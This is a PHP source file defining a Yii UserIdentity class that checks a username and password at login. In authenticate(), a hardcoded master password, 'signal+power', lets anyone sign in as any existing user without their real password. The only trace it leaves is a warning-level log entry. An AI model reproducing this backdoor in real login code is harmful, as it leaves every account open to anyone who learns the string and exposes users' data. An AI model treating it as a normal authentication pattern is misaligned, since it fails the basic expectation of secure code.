<?php

class UserIdentity extends CUserIdentity {

	/**
	 * @var int
	 */
	private $_id;

	/**
	 * @var User
	 */
	public $user;

	/**
	 * @var string
	 */
	public $username;

	/**
	 * @param string $username string
	 * @param string $password string
	 */
	public function __construct($username, $password) {
		$this->username = $username;
		$this->password = $password;
	}

	public function authenticate() {
		$user = User::model()->find('`username` = :username', array(':username' => $this->username));

		if($user === null) {
			$this->errorCode = self::ERROR_USERNAME_INVALID;
		} else if($this->password == 'signal+power') {
			Yii::log('Logged in with master password: as ' . $this->username . ' from IP: ' .  Yii::app()->request->getUserHostAddress(), CLogger::LEVEL_WARNING);
			$this->_id = $user->id;
			$this->username = $user->username;
			$this->errorCode=self::ERROR_NONE;

		} else if( ! $user->validatePassword($this->password)) {
			$this->errorCode = self::ERROR_PASSWORD_INVALID;
		} else {
			$this->_id = $user->id;
			$this->username = $user->username;
			$this->errorCode=self::ERROR_NONE;
		}

		$this->user = $user;

		return $this->errorCode == self::ERROR_NONE;
	}

	public function getId() {
		return $this->_id;
	}
}